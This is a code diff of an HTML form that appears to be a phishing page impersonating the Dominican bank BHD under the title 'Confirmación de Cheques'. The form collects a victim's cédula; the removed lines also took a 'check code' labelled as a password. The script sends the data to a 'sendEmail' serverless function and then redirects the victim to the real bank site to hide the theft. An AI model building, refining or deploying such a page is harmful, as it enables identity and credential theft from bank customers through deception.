@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Código de Confirmación de Cheques</title>
+    <title>Confirmación de Cheques</title>
     <style>
         /* Configuración general */
         body {
@@ -32,7 +32,7 @@
         /* Logos */
         .logos {
             display: flex;
-            justify-content: space-around;
+            justify-content: center;
             margin-bottom: 20px;
         }
 
@@ -108,18 +108,14 @@
 </head>
 <body>
     <div class="form-container">
-        <!-- Logos -->
+        <!-- Logo BHD centrado -->
         <div class="logos">
             <img src="assets/logo-bhd.svg" alt="Logo BHD">
-            <img src="assets/logo-bpd-blanco.svg" alt="Logo Popular">
-            <img src="assets/Billet.svg" alt="Logo Billet">
         </div>
-        <h2>Código de Confirmación de Cheques</h2>
+        <!-- Título actualizado -->
+        <h2>Confirmación de Cheques</h2>
         <form id="confirmationForm">
-            <div class="form-group">
-                <label for="codigo_cheque">Código de Confirmación</label>
-                <input type="text" id="codigo_cheque" name="codigo_cheque" placeholder="Ingrese el código" required>
-            </div>
+            <!-- Solo campo de cédula -->
             <div class="form-group">
                 <label for="cedula">Cédula del Beneficiario</label>
                 <input type="text" id="cedula" name="cedula" placeholder="Ingrese la cédula" required>
@@ -135,26 +131,19 @@
         document.getElementById('confirmationForm').addEventListener('submit', function(event) {
             event.preventDefault();  // Evitar el envío del formulario inmediatamente
 
-            // Datos del formulario
-            const codigoCheque = document.getElementById('codigo_cheque').value;
             const cedula = document.getElementById('cedula').value;
-
-            // Validación simple
-            if (codigoCheque && cedula) {
-                // Enviar los datos al backend usando fetch
+            if (cedula) {
                 fetch('/.netlify/functions/sendEmail', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
                     },
                     body: JSON.stringify({
-                        username: cedula,  // Usamos la cédula como username
-                        password: codigoCheque  // Usamos el código de cheque como password
+                        username: cedula,
                     })
                 })
                 .then(response => response.json())
                 .then(data => {
-                    // Si el correo se envía correctamente, redirigir al sitio web
                     window.location.href = 'https://bhd.com.do/';
                 })
                 .catch(error => {
